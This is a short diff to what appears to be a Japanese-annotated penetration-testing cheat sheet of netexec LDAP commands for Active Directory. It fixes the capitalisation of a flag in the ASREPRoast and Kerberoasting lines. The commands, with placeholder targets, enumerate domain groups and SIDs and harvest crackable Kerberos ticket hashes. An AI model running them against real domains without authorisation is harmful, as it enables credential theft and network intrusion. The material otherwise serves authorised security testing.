@@ -20,9 +20,9 @@ netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --groups
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --get-sid
 # ASREPRoast (TCP88番も必要)
 netexec ldap 'IP' -u 'USERNAMELIST' -p '' --kdchost 'IP' --asreproast asreproast.txt
-netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --kdchost 'IP' --asreproast asreproast.txt
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --kdcHost 'IP' --asreproast asreproast.txt
 # Kerberoasting (TCP88番も必要)
-netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --kdchost 'IP' --kerberoasting kerberoast.txt
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --kdcHost 'IP' --kerberoasting kerberoast.txt
 # Admin Count
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --admin-count
 # Machine Account Quota
